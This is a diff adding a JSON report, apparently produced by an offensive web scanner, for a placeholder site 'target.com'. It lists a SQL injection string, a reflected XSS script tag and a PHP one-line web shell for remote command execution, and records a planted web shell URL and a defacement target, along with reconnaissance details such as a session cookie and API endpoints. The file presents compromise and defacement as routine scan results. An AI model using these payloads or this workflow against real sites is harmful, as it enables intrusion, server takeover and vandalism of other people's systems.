@@ -1,0 +1,36 @@
+{
+  "target": "http://target.com",
+  "domain": "target.com",
+  "scan_date": "2024-01-15T10:30:00",
+  "total_vulns": 3,
+  "vulnerabilities": [
+    {
+      "type": "SQLi",
+      "url": "http://target.com?id=1' OR '1'='1",
+      "payload": "' OR '1'='1",
+      "evidence": "SQL error"
+    },
+    {
+      "type": "XSS",
+      "url": "http://target.com?q=<script>alert(1)</script>",
+      "payload": "<script>alert(1)</script>",
+      "evidence": "Reflected"
+    },
+    {
+      "type": "RCE",
+      "url": "http://target.com?cmd=id",
+      "payload": "<?php system($_GET['cmd']); ?>",
+      "evidence": "Command output"
+    }
+  ],
+  "webshell": "http://target.com/shell.php",
+  "deface": "http://target.com/index.html",
+  "deep_analysis": {
+    "headers": {"Server": "Apache/2.4.54"},
+    "cookies": {"PHPSESSID": "abc123"},
+    "forms": 2,
+    "ajax": ["/api/getdata"],
+    "api_endpoints": ["/api/v1/users"],
+    "parameters": ["id", "q", "cmd"]
+  }
+}
